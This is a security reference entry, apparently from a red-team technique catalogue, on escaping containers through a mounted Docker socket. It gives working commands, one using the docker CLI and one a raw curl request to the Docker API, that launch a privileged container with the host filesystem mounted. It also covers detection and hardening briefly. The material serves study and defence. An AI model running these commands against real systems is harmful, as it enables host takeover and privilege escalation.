# [PE-EXPLOIT-006]: Container Runtime Socket Abuse

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-EXPLOIT-006 |
| **MITRE ATT&CK v18.1** | [Exploitation for Privilege Escalation (T1068)](https://attack.mitre.org/techniques/T1068/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Docker / Kubernetes |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Some containers (e.g., CI/CD agents, monitoring tools) mount the Docker socket (`/var/run/docker.sock`) or containerd socket to spawn sibling containers. If an attacker compromises such a container, they can talk to the Docker daemon on the host. Since the daemon runs as root, they can launch a *new* container with `privileged` flags and host mounts, escaping their confined environment.
- **Attack Surface:** Mounted Sockets.
- **Business Impact:** **Host Takeover**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Access to socket file.
- **Tools:** `docker`, `curl`

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Check Socket**
```bash
ls -l /var/run/docker.sock
```

**Step 2: Exploit (Docker CLI)**
If docker CLI is installed:
```bash
docker run -it --privileged --net=host --pid=host -v /:/mnt alpine chroot /mnt bash
```

**Step 3: Exploit (curl)**
If no CLI, use raw API.
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "alpine", "HostConfig": {"Privileged": true, "Binds": ["/:/mnt"]}}' http://localhost/containers/create
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Host Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Docker Events** | `create` | Container creation with `Privileged=true` originating from another container. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Kaniko:** Use rootless builders like Kaniko for CI/CD instead of "Docker-in-Docker" (mounting the socket).
*   **Socket Protection:** Never mount the socket into untrusted containers.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-003]
> **Next Logical Step:** [PE-EXPLOIT-004]
